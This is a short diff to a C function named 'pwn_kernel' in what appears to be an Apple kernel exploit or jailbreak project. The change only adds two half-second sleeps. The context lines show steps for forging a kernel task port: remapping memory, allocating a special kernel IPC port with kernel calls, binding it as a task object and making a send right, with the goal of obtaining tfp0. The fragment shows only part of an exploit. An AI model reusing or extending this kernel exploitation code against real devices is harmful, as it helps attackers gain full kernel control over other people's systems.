@@ -770,6 +770,8 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     }
     
     LOG("[+] remap addr: %llx", remap_addr);
+
+    usleep(500000);
     
     mach_port_destroy(mach_task_self(), maps[0]);
     mach_port_destroy(mach_task_self(), maps[1]);
@@ -790,6 +792,8 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     uint64_t new_port = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
     LOG("new_port: %llx", new_port);
     
+    usleep(500000);
+
     kcall(offsets.funcs.ipc_kobject_set, 3, new_port, remap_addr, IKOT_TASK);
     kcall(offsets.funcs.ipc_port_make_send, 1, new_port);
     
